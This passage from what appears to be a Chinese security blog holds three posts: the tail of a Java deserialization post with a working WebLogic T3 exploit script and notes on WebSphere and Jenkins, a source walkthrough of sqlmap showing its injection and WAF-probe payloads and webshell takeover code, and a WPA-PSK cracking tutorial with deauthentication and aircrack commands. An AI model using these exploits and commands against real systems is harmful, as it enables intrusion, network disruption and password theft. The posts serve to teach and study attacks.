'000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371' data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000&#123;0&#125;ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format('&#123;:04x&#125;'.format(dport)) data3 = '1a7727000d3234322e323134' data4 = '2e312e32353461863d1d0000000078' for d in [data1,data2,data3,data4]: sock.send(d.decode('hex')) time.sleep(2) print 'send request payload successful,recv length:%d'%(len(sock.recv(2048)))def sendEvilObjData(sock,data): payload='056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000' payload+=data payload+='fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff' payload = '%s%s'%('&#123;:08x&#125;'.format(len(payload)/2 + 4),payload) sock.send(payload.decode('hex')) res = '' try: while True: res += sock.recv(4096) time.sleep(0.1) except Exception as e: pass return resdef checkVul(res,server_addr,index): p=re.findall(VER_SIG[index], res, re.S) if len(p)&gt;0: print '%s:%d is vul %s'%(server_addr[0],server_addr[1],VUL[index]) else: print '%s:%d is not vul %s' % (server_addr[0],server_addr[1],VUL[index])def run(dip,dport,index): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) ##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整 sock.settimeout(50) server_addr = (dip, dport) t3handshake(sock,server_addr) buildT3RequestObject(sock,dport) rs=sendEvilObjData(sock,PAYLOAD[index]) checkVul(rs,server_addr,index)if __name__=="__main__": dip = '10.8.56.17' dport = 7001 for i in range(0,len(VUL)): run(dip,dport,i) WebSphereCVE-2015-4852WebSphere的反序列化漏洞发生的位置在SOAP的通信端口8880，使用的通信协议是https，发送的数据是XML格式的数据。 这个版本的Websphere没进行任何的过滤处理，直接进行了反序列化。 所以只要把恶意代码（和之前jboss的攻击方式一样）base64编码后通过SOAP协议发送至有漏洞的服务器即可命令执行。 JenkinsCVE-2015-8103想要使用这个漏洞利用Java应用，则需要找一个序列化对象的接收入口，并且这个Java应用使用了Commons Collections库。Jenkins是一个开源的持续集成软件。Jenkins启动后会开放多个端口，除了Web控制台之外还有一个CLI端口。CLI端口为随机的高端口，通过jenkins目录下的WEB-INF/jenkins-cli.jar程序可以和CLI端口进行通信。分析通信数据包发现存在base64编码的Java序列化特征值rO0AB。 jenkins-cli.jar在与CLI端口通信之前，会先HTTP GET请求一下jenkins的Web控制台，从响应包中解析出CLI的端口，再做后续通信。 从下图的head头部可以看到随机的序列化对象的接收入口。 X-Jenkins-CLI2-Port是采用SSL加密通信，而如果未解析到X-Jenkins-CLI2-Port头，则会解析X-Jenkins-CLI-Port头，此时Jenkins-CLI通信协议自动降为Version1，并且无SSL加密。 只要将恶意代码序列化后进行base64加密（base64编码后不能有换行），并代替掉之前截到的数据包中的base64字段即可。 由于此漏洞的命令执行结果也是不回显的，上传jar包的方式也只能打印到控制台，依旧不能解决回显问题。如果采用nslookup等方式来检测漏洞也常有漏网之鱼（如果服务器不能主动向外发包）。 总结花了几天时间复现了这些著名的漏洞，颇有收获，稍微了解了各个中间件的一些情况以及的反序列化漏洞的触发方式。 参考文章1参考文章2参考文章3参考文章4参考文章5参考文章6参考文章7参考文章8参考文章9]]></content>
      <categories>
        <category>code execution</category>
      </categories>
      <tags>
        <tag>code execution</tag>
        <tag>java</tag>
        <tag>java unserialize</tag>
        <tag>jboss</tag>
        <tag>weblogic</tag>
        <tag>jenkins</tag>
        <tag>websphere</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Sqlmap Code Analysis]]></title>
    <url>%2F2017%2F09%2F27%2Fsqlmap-code-analysis%2F</url>
    <content type="text"><![CDATA[概述不得不承认，Sqlmap是目前使用人数最多，功能最复杂的SQL注入工具。作为一款开源工具，开发者有意的让我们自行去阅读并对其进行扩充，从Github可以看出一直在更新的。对于渗透人员来说，阅读sqlmap源码是很有必要的，我们可以从它的源码之中学习到一些优秀的代码编写思维以及方式，应用到平时的渗透中去。 Sqlmap的结构首先看看Sqlmap的目录结构： 目录说明: 123456789101112131415Doc 帮助文档Extra 拓展程序，包含多种额外功能，例如运行cmd、安全执行、shellcode等Lib 类库程序，包含多种连接库，如5种注入类型、提权操作Plugins 插件程序，包括各种数据库的信息以及数据库的通用事项Procs sql语句，包含oracle，postgresql 等的dns_request程序、Mysql的读写文件、mssql的xp_cmdshell等sql语句Shell shell应用，包含多个语言注入成功的shell脚本Tamper 多个绕过程序Thirdparty 第三方程序，如beautifulsoup、优化，保持连接，颜色等等Txt 爆破字典，如浏览器类型、 表，列字典Udf 用户定义的mysql的攻击载荷Waf waf防火墙特征指纹Xml 多种数据库检测载荷以及指纹定义sqlmap.conf 配置文件sqlmap.py 主程序sqlmap.api 接口程序 Sqlmap的流程图如下所示： 概括起来就是当在命令行输入命令的时候，sqlmap首先会进行初始化的操作（版本检测、模块检测、命令行参数解析、Session读取等），之后便会简单的检测是否存在注入点，如果存在注入点便会进行进一步的注入，最后才是接管（takeover）操作。 Sqlmap初始化大部分工具在进行攻击时都会进行初始化，Sqlmap也不例外。为了保证Sqlmap的正常运行首先需要进行python的版本、功能模块的自检。 1234567891011121314151617181920212223# sqlmap.py 开头，这里利用__import__()抛出的异常来检查必要库的存在。try: __import__("lib.utils.versioncheck") # this has to be the first non-standard importexcept ImportError: exit("[!] wrong installation detected (missing modules). Visit 'https://github.com/sqlmapproject/sqlmap/#installation' for further details")``` 下面是import的模块：``` python# /lib/utils/versioncheck.py if PYVERSION &gt;= "3" or PYVERSION &lt; "2.6": exit("[CRITICAL] incompatible Python version detected ('%s'). For successfully running sqlmap you'll have to use version 2.6.x or 2.7.x (visit 'http://www.python.org/download/')" % PYVERSION)extensions = ("gzip", "ssl", "sqlite3", "zlib")try: for _ in extensions: __import__(_)except ImportError: errMsg = "missing one or more core extensions (%s) " % (", ".join("'%s'" % _ for _ in extensions)) errMsg += "most likely because current version of Python has been " errMsg += "built without appropriate dev packages (e.g. 'libsqlite3-dev')" exit(errMsg) 在这之后才进入main()函数,而main()函数的开头便是检查环境（路径、版本）、输出banner信息、读取命令行参数。这里主要关注的是modulePath()函数，为了方便在Windows以及Linux上运行，这里统一将操作系统的编码转化为Unicode编码后返回： 1234567891011121314# sqlmap.pydef main(): checkEnvironment() setPaths(modulePath()) banner() # Store original command line options for possible later restoration cmdLineOptions.update(cmdLineParser().__dict__) nitOptions(cmdLineOptions) ....def modulePath(): ... return getUnicode(os.path.dirname(os.path.realpath(_)), encoding=sys.getfilesystemencoding() or UNICODE_ENCODING) 之后利用python的optionparser模块来对输入的参数进行分析，在此之前，提取出第一个参数前的内容，例python sqlmap.py作为参数传入OptionParser之后就是对参数进行分析了，首先是帮助、版本、log级有关参数。 123456789# /lib/parse/cmdline def cmdLineParser(argv=None): ... try: parser.add_option("--hh", dest="advancedHelp",action="store_true",help="Show advanced help message and exit") parser.add_option("--version", dest="showVersion",action="store_true",help="Show program's version number and exit") parser.add_option("-v", dest="verbose", type="int",help="Verbosity level: 0-6 (default %d)" % defaults.verbose) .... ... 主要显示如下： 接下来便是一个init()函数，千万不要小看这个init()函数，因为它做了很多很多的工作，当然它大部分与你输入的参数有关： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859# /lib/core/option.pydef init(): _useWizardInterface() # 引导界面、新手教学 setVerbosity() # 设置输出的详细程度 _saveConfig() # 保存参数到配置文件 _setRequestFromFile() # 读取文件中的http请求 _cleanupOptions() # 清除配置选项 _cleanupEnvironment() # 清除环境变量 _dirtyPatches() # 设置http的最大行数 _purgeOutput() # 文件粉碎 _checkDependencies() # 检查第三方库是否存在，比如mysql、mssql等连接库 _createTemporaryDirectory() # 创建临时目录 _basicOptionValidation() # 检查参数是否有效 _setProxyList() # 设置代理 _setTorProxySettings() # 设置tor代理 _setDNSServer() # 设置dns服务器 _adjustLoggingFormatter() # 调整日志格式 _setMultipleTargets() # 检测多个目标 _setTamperingFunctions() # tamper模块 _setWafFunctions() # waf识别模块 _setTrafficOutputFP() _setupHTTPCollector() _resolveCrossReferences() _checkWebSocket() # 检测websocket parseTargetUrl() # 分析目标检查url，并给config赋值 parseTargetDirect() # 分析目标数据库，并给config赋值 if any((conf.url, conf.logFile, conf.bulkFile, conf.sitemapUrl, conf.requestFile, conf.googleDork, conf.liveTest)): _setHTTPTimeout() _setHTTPExtraHeaders() # 设置http头 _setHTTPCookies() _setHTTPReferer() _setHTTPHost() _setHTTPUserAgent() _setHTTPAuthentication() # 设置http验证方式 _setHTTPHandlers() _setDNSCache() _setSocketPreConnect() # 创建一个预连接的socker connect _setSafeVisit() _doSearch() # 搜索url注入 _setBulkMultipleTargets() # 通过bulkfile读取多个url列表 _setSitemapTargets() # 分析sitemap读取url列表 _checkTor() _setCrawler() # 页面爬取深度 _findPageForms() # 从页面中搜索表单 _setDBMS() # 设置数据库类型 _setTechnique() # 设置注入类型 _setThreads() # 设置线程数 _setOS() _setWriteFile() _setMetasploit() # 设置msf接管功能 _setDBMSAuthentication() loadBoundaries() # 加载boundaries.xml文件 loadPayloads() # 加载payload.xml文件 _setPrefixSuffix() update() # sqlmap自动更新 _loadQueries() # 加载queries.xml文件 在初始化之后，便根据不同的需求运行不同的代码，如下所示：123456789101112131415# sqlmap.py#性能的自测功能，输出是图形文件，可以看出整个程序每个步骤的占用时间百分比、函数调用次数，便于能够直观看出程序运行的瓶颈所在。if conf.profile: profile() # 冒烟测试，简单来说就是对一个软件镜像尽可能的功能覆盖测试。 elif conf.smokeTest: smokeTest()# 从livetests.xml里加载用于测试注入功能的网站和配置样例，进行全面的注入测试。elif conf.liveTest: liveTest()else: try: start() # 真正的开始运行 except thread.error as ex: .... 前三个部分主要是软件的测试，和我们平时渗透没有多大关系，这里便不继续深究下去。 Sqlmap核心数据库直连sqlmap可以通过-d参数来直接连接目标数据库，不过一般需要额外安装第三方模块。 123456# /lib/controller/controller.pyif conf.direct: initTargetEnv() setupTargetEnv() action() return True 读取Session对一个网站进行sql注入测试的时候，sqlmap一般会在当前用户的目录下创建一个.sqlmap目录，里面一般会保存目标网站的一些日志、注入点设置、session信息。session信息一般会以sqllite数据库文件的形式存储，里面主要是id、value两个字段，具体图如下： 它的value值一部分是以明文的形式存储，另一部是AttribDict这个对象序列化后的以base64编码后的形式存储的。 注入标记符接下来是检索注入标记符并给出提示询问是否对标记点检测注入，也就是我们常用的*，来指定注入的位置。 123456789101112131415161718192021222324252627282930313233# /lib/core/target.py if conf.data is not None: conf.method = HTTPMETHOD.POST if not conf.method or conf.method == HTTPMETHOD.GET else conf.method hintNames = [] def process(match, repl): retVal = match.group(0) # 先取出整个字符串 if not (conf.testParameter and match.group("name") not in conf.testParameter): # 如果没有指定注入参数 retVal = repl while True: _ = re.search(r"\\g&lt;([^&gt;]+)&gt;", retVal) if _: retVal = retVal.replace(_.group(0), match.group(int(_.group(1)) if _.group(1).isdigit() else _.group(1))) else: break if kb.customInjectionMark in retVal: # 如果有注入标记符 hintNames.append((retVal.split(kb.customInjectionMark)[0], match.group("name"))) return retVal # 如果data中有注入标记符(这里默认的就是*星号，可以用来指定注入位置) if kb.processUserMarks is None and kb.customInjectionMark in conf.data: message = "custom injection marker ('%s') found in option " % kb.customInjectionMark message += "'--data'. Do you want to process it? [Y/n/q] " choice = readInput(message, default='Y').upper() if choice == 'Q': raise SqlmapUserQuitException else: kb.processUserMarks = choice == 'Y' if kb.processUserMarks: kb.testOnlyCustom = True actionsqlmap 的aciton比较简介，功能也比较清楚，主要就是根据我们的参数来dump相应的数据以及接管的操作,我稍微列举了几个有代表性的功能。 123456789101112131415161718192021222324252627# /lib/controller/action.py def action(): ... # dump if conf.getDbs: conf.dumper.dbs(conf.dbmsHandler.getDbs()) if conf.getTables: conf.dumper.dbTables(conf.dbmsHandler.getTables()) if conf.commonTables: conf.dumper.dbTables(tableExists(paths.COMMON_TABLES)) ... # takeover if conf.osCmd: conf.dbmsHandler.osCmd() if conf.osShell: conf.dbmsHandler.osShell() if conf.regRead: conf.dumper.registerValue(conf.dbmsHandler.regRead()) if conf.regAdd: conf.dbmsHandler.regAdd() .... Waf指纹接下来是加载WAF/IDS/IPS测试函数(可选参数)，conf.identifyWaf对应的是--identify-waf参数，sqlmap能够测试的WAF基本上是很齐全了，都在waf目录中。 从上图中的右边代码可以清楚的看出，主要就是发送几个payload来查看服务器做出的回应。然后根据正则等方式进行waf的指纹匹配. 主要发送的payload我也看一下，由以下四部分组成： 12345678910# /lib/core/settings.pyWAF_ATTACK_VECTORS = ( "", # NIL "search=&lt;script&gt;alert(1)&lt;/script&gt;", "file=../../../../etc/passwd", "q=&lt;invalid&gt;foobar", "id=1 %s" % IDS_WAF_CHECK_PAYLOAD)IDS_WAF_CHECK_PAYLOAD = "AND 1=1 UNION ALL SELECT 1,NULL,'&lt;script&gt;alert(\"XSS\")&lt;/script&gt;',table_name FROM information_schema.tables WHERE 2&gt;1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#" crawl爬虫sqlmap的爬虫模块主要--crawl这个参数有关，可以收集潜在的可能存在漏洞的连接，后面跟的参数是爬行的深度。crawl函数在爬虫模块/lib/utils/crawler.py中。代码就不进行列举了，简单的说明下就是Sqlmap会创建一个visited队列和一个value队列，然后进行爬行，先将页面的url通过正则、sitemap之后放入value队列（去重），然后将爬过了url放入visited队列（去重），每次爬行时都会先看看是否已经visited。 接下来是--forms，解析出页面的所有表单的功能实现。调用了/lib/core/common.py中的findPageForms()函数，而对于除了-u方式直接输入目标url的其他输入方式都采用先解析urls，再分别查表的方式 payload(核心)Sqlmap最强大的就是它的注射技术，这也是它最为核心的部分。Sqlmap启动后首先设置测试的level和risk，并识别受测试元素的类型，最终拼凑出相应的漏洞利用方案。这里的payload它主要由boundaries、payloads、queries这几部分组成，且都保存在xml目录下。 boundariesboundaries.xml中保存了注入语句的前缀、后缀，主要就是用来闭合注入点处的前半部分和后半部分。举个例子来说: ?keyword=hello world这里keyword存在注入点，并且是搜索行注入，那么它在服务器端拼接成的语句就是: 1select * from articles where title like '%hello world%'; 所以sqlmap就需要闭合掉前面的引号和后面的引号，就可能会用到boundaries.xml的下列部分： 12345678&lt;boundary&gt; &lt;level&gt;1&lt;/level&gt; &lt;!-- \-\-level 的等级--&gt; &lt;clause&gt;1&lt;/clause&gt; &lt;!-- 从句的类型--&gt; &lt;where&gt;1,2&lt;/where&gt; &lt;!-- 语句注入处, 1 为原始数据后注入，2为随机数后注入--&gt; &lt;ptype&gt;2&lt;/ptype&gt; &lt;prefix&gt;%'&lt;/prefix&gt; &lt;!-- 闭合前半部分--&gt; &lt;suffix&gt; AND '%'='&lt;/suffix&gt; &lt;!-- 闭合后半部分--&gt;&lt;/boundary&gt; 最终会闭合成： 1select * from articles where title like '%hello world%' AND '%'='%'; payloadsxml/payloads 目标下保存着六种注入类型（基于布尔、基于时间、基于错误、union、内联、堆叠）的payload，一般以&lt;test&gt;为结点，&lt;test&gt;具有特定漏洞的全部信息，包括漏洞的level、risk，漏洞类型，利用的方法，检测方法等。主要格式如下： 1（keyword=&apos;%hello world）+prefix（%&apos;）+payloads（AND [RANDNUM]=[RANDNUM]）+comment（#）+suffix（AND (&apos;%&apos;=&apos;） + （ %&apos;） queriesqueries.xml主要就是具体的dump语句了： 12345678910&lt;root&gt; &lt;!-- MySQL --&gt; &lt;dbms value="MySQL"&gt; &lt;!-- .... --&gt; &lt;hostname query="@@HOSTNAME"/&gt; &lt;table_comment query="SELECT table_comment FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s' AND table_name='%s'"/&gt; &lt;column_comment query="SELECT column_comment FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s' AND table_name='%s' AND column_name='%s'"/&gt; &lt;is_dba query="(SELECT super_priv FROM mysql.user WHERE user='%s' LIMIT 0,1)='Y'"/&gt; &lt;check_udf query="(SELECT name FROM mysql.func WHERE name='%s' LIMIT 0,1)='%s'"/&gt; &lt;!-- .... --&gt; example在测试一个参数的时候sqlmap会遍历所有符合要求的test节点，会分别发送request与response节点下的payload，然后对服务器响应的数据包进行对比，看其是否存在差异，当确认存在注入的时候，就会以vector来加载queries.xml中的查询语句进行注入。 拿个实际注入的例子来说： TamperSqlmap 的Tamper模块主要就是用来绕waf用的，一般都保存在tamper 目录中，可以依据标准格式自定义，比如把payload用like替换等号，base64编码等…..，tamper都是具有一定的格式的，如果在渗透测试中发现sqlmap自带的tamper不符合，便可以依样画葫芦写个tamper出来： 下面是sqlmap自带的tamper，主要将等号替换成like的tamper： 12345678910111213141516171819202122232425262728# quealtolike.py def dependencies(): singleTimeWarnMessage("tamper script '%s' is unlikely to work against %s" % (os.path.basename(__file__).split(".")[0], DBMS.PGSQL))def tamper(payload, **kwargs): """ Replaces all occurances of operator equal ('=') with operator 'LIKE' Tested against: * Microsoft SQL Server 2005 * MySQL 4, 5.0 and 5.5 Notes: * Useful to bypass weak and bespoke web application firewalls that filter the equal character ('=') * The LIKE operator is SQL standard. Hence, this tamper script should work against all (?) databases &gt;&gt;&gt; tamper('SELECT * FROM users WHERE id=1') 'SELECT * FROM users WHERE id LIKE 1' """ retVal = payload if payload: retVal = re.sub(r"\s*=\s*", " LIKE ", retVal) return retVal Sqlmap接管接下来是跟提权/后门/系统有关的模块，主要与takeover.py这类型的脚本有关。 下面是osCmd() 函数： 123456789101112131415161718192021def osCmd(self): if isStackingAvailable() or conf.direct: web = False elif not isStackingAvailable() and Backend.isDbms(DBMS.MYSQL): infoMsg = "going to use a web backdoor for command execution" logger.info(infoMsg) web = True else: errMsg = "unable to execute operating system commands via " errMsg += "the back-end DBMS" raise SqlmapNotVulnerableException(errMsg) self.getRemoteTempPath() # 得到远程临时路径,写入webshell self.initEnv(web=web) if not web or (web and self.webBackdoorUrl is not None): self.runCmd(conf.osCmd) # 执行命令 if not conf.osShell and not conf.osPwn and not conf.cleanup: self.cleanup(web=web) # 清除shell webshellsqlmap自带了一部分的webshell，主要保存在shell目录下，由stager（上传马）、backdoor（执行马），不过这些webshell被压缩过了： php的上传马(stager)： php的执行马(backdoor)： 各位有兴趣的可以改成自己的webshell，压缩的代码如下： 1234567891011data = zlib.decompress(hideAscii(data))def hideAscii(data): retVal = "" for i in xrange(len(data)): if ord(data[i]) &lt; 128: retVal += chr(ord(data[i]) ^ 127) else: retVal += data[i] return retVal Sqlmap其他模块文件粉碎sqlmap自带了文件粉碎功能，可以安全删除文件，且无法恢复。主要由整理硬盘垃圾数据，获取文件句柄，填充垃圾数据，随机命名，最终删除这几个步骤组成。 1234567891011121314151617181920212223242526def purge(directory): ... # 遍历文件 for rootpath, directories, filenames in os.walk(directory): dirpaths.extend([os.path.abspath(os.path.join(rootpath, _)) for _ in directories]) filepaths.extend([os.path.abspath(os.path.join(rootpath, _)) for _ in filenames]) # 修改文件读写属性 for filepath in filepaths: try: os.chmod(filepath, stat.S_IREAD | stat.S_IWRITE) except: pass # 填充垃圾数据 for filepath in filepaths: try: filesize = os.path.getsize(filepath) with open(filepath, "w+b") as f: f.write("".join(chr(random.randint(0, 255)) for _ in xrange(filesize))) except: pass # 截断文件 ... # 重命名文件 ... # 删除文件 ... Sqlmap api如果我们要做二次开发，就可以直接利用这个sqlmap的api，通过进程通信的方式来完成sqlmap的功能,具体请参考这里。 异常汇报在脚本运行中难免会碰到这样那样的错误，sqlmap因此做了很多异常捕获以及处理，如果sqlmap捕获到的异常它无法识别以及处理，便会上传到github上，因此来告知开发者对其进行bug的修复。 1234567891011121314151617181920212223def createGithubIssue(errMsg, excMsg): ...... if choice: ex = None errMsg = errMsg[errMsg.find("\n"):] req = urllib2.Request(url="https://api.github.com/search/issues?q=%s" % urllib.quote("repo:sqlmapproject/sqlmap Unhandled exception (#%s)" % key)) try: content = urllib2.urlopen(req).read() _ = json.loads(content) duplicate = _["total_count"] &gt; 0 closed = duplicate and _["items"][0]["state"] == "closed" if duplicate: warnMsg = "issue seems to be already reported" if closed: warnMsg += " and resolved. Please update to the latest " warnMsg += "development version from official GitHub repository at '%s'" % GIT_PAGE logger.warn(warnMsg) return except: pass 自动更新这部分就不便多展开了，主要就是指sqlmap支持一键升级的功能： 总结这几天大致阅读了Sqlmap的源码，才明白了Sqlmap的强大之处不仅仅在于它的注射功能，更在于它那优秀的代码编码方式、优秀的设计理念、Pythonic 的技巧、各种Python内置模块以及第三方模块的调用等等。也因此学习到了很多新的知识，比如临时文件的粉碎级别删除等等，看了它那优秀的编码后才明白自己平时渗透测试时写的脚本看上去狗爬一般。看来平时还得多抽空看看那些有些的渗透框架、工具，这样才可以尽量避免闭门造车，省去很多很多精力。]]></content>
      <categories>
        <category>tool</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>sqlmap</tag>
        <tag>code</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[无线攻击——WIFI]]></title>
    <url>%2F2017%2F07%2F02%2Fwifi-burst%2F</url>
    <content type="text"><![CDATA[概述工作需要学习一点无线知识，索性就买了个USB的无线网卡，做了个实验，简单了解下wifi无线破解的知识。 基础知识WEP(Wired Equivalent Privacy有线对等保密)最早的无线加密体制，由于算法的缺陷很容易被破解。抓包获取在数据流中明文传输的IV，再通过统计学方法用IV得到密钥。 WPA在不升级硬件的前提下，WAP使用TKIP(Temporal Key Integrity Protocol临时密钥集成协议) 来实现WLAN的访问控制、密钥管理和数据加密来增强WEP的安全性。WPA加密算法有两个版本。 WPA = 802.1x + EAP + TKIP + MIC = Pre-shared Key + TKIP + MIC WPA2 = 802.1x + EAP + AES + CCMP = Pre-shared Key + AES + CCMP PS:身份校验算法：802.1x + EAP（工业级、不怕网络劫持和字典攻击、认证服务器）、Pre-shared Key（家庭用、容易被字典攻击、无服务器）数据传输加密算法：TKIP、AES数据完整性校验算法：MIC、CCMP WPA-PSK 的四次握手过程 AP初始化 使用 SSID 和passphares作为入参，通过哈希算法产生PSK。在WPA-PSK 中PSK=PMK=pdkdf2_SHA1(passphrase, SSID, SSID length, 4096) 第一次握手 AP广播SSID，AP_MAC(AA)；STATION 端使用接收到的SSID，AP_MAC和passphares使用同样算法产生PSK。 第二次握手 STATION 发送一个随机数SNonce，STATION_MAC(SA)给AP；AP端接收到SNonce、STATION_MAC(SA)后产生一个随机数ANonce，然后用 PMK、AP_MAC(AA)、STATION_MAC(SA)、SNonce、ANonce 用以下SHA1_PRF算法产生PTK，提取这个 PTK 前16 个字节组成一个MIC KEY。PTK=SHA1_PRF(PMK, Len(PMK), “Pairwise key expansion”, MIN(AA, SA) || Max(AA, SA) || Min(ANonce, SNonce) || Max(ANonce, SNonce)) 第三次握手 AP发送上面产生的ANonce给STATIONSTATION 端用接收到ANonce 和以前产生PMK、SNonce、AP_MAC(AA)、STATION_MAC(SA)用同样的算法产生PTK。提取这个PTK 前16 个字节组成一个MIC KEY使用以下算法产生MIC值用这个MIC KEY 和一个802.1X数据帧使用以下算法得到MIC值MIC = HMAC_MD5(MIC Key，16，802.1X data) 第四次握手 STATION 发送802.1X 数据帧，MIC给AP；STATION 端用上面那个准备好的802.1X 数据帧在最后填充上MIC值和两个字节的0（十六进制）然后发送这个数据帧到AP。AP端收到这个数据帧后提取这个MIC。并把这个数据帧的MIC部分都填上0（十六进制）这时用这个802.1X数据帧，和用上面AP产生的 MIC KEY 使用同样的算法得出MIC’。如果MIC’等于STATION 发送过来的MIC。那么第四次握手成功。若不等说明则AP 和 STATION 的密钥不相同，握手失败了。 破解WPA—PSK破解原理用我们字典中的Passphrase+SSID先生成PMK，然后结合握手包中的STA_MAC、AP_MAC、ANONCE、SNONCE计算PTK，再加上原始的报文数据算出MIC并与AP发送的MIC比较，如果一致，那么该PSK就是密钥。 环境 VMware workstation 中安装的Kali Linux 2.0 (2018.1) TL-WN725N 无线网卡 PS：由于是虚拟机，注意是否usb挂载成功以及宿主机的VM usb服务是否开启。 插上USB无线网卡后，运行iwconfig以及lsusb，发现kali没有相关驱动： 安装驱动 安装内核源代码、内核头文件以及编译环境。 123apt-get install linux-source # 安装内核源代码apt-get install linux-headers-$(uname -r) # 安装内核头文件apt-get install build-essential # 安装编译环境 在虚拟机中安装网卡驱动。 由于官网找不到这个型号网卡在Linux上的驱动，通过google找到了可用的驱动，选择其中一个下载并安装即可： 驱动一 驱动二 运行airmon-ng或者iwconfig，驱动安装成功： 123root@kali:/# airmon-ng PHY Interface Driver Chipsetphy1 wlan0 mt7601u Ralink Technology, Corp. MT7601U 破解过程 把usb网卡插入虚拟机，并开启网卡到监听模式，命令如下： 1airmon-ng start wlan0 (wlan0为无线网卡名称) 抓包查看所在区域无线网的状态，选择需破解的目标网络，命令如下： 1airodump-ng wlan0mon ( wlan0mon 为无线网卡名称) 抓取目标网络的握手包，命令如下： 1airodump-ng -c 1 --bssid F0:B4:29:65:06:1B -w /root/Desktop/ wlan0mon 如果抓不到握手包，说明没有人用这个热点。 重新打开一个terminal窗口，使用DEAUTH攻击使已经连接的客户端断开并重新连接，以产生握手包。（注意：抓握手包破解必须有合法的客户端才行）命令如下： 12# 参数解释：- 0 deauth攻击 10：进行10次攻击 -a：AP的MAC地址 -c：已连接该AP的客户端MAC地址aireplay-ng -0 10 -a F0:B4:29:65:06:1B -c D8:63:75:BE:7B:F7 wlan0mon （多试几次） 当获取到握手包时会出现红框内的信息： 通过四次握手包和字典破解密码 12# -a2 WPA的方法破解握手包 -w：字典路径 -02.cap： 第四步中抓取的握手包文件名 aircrack-ng -a2 -b F0:B4:29:65:06:1B -w /root/Desktop/6000_password.txt /root/Desktop/-02.cap 总结编译Linux驱动还很烦人的，主要时间还是浪费在了驱动上，破解操作比较简单，基本安装参考文章来的。 参考文章： WPA-PSK无线网络破解原理与过程]]></content>
      <categories>
        <category>wifi</category>
      </categories>
      <tags>
        <tag>wifi</tag>
        <tag>wpa</tag>
        <tag>wep</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android CodeEngn 练习]]></title>
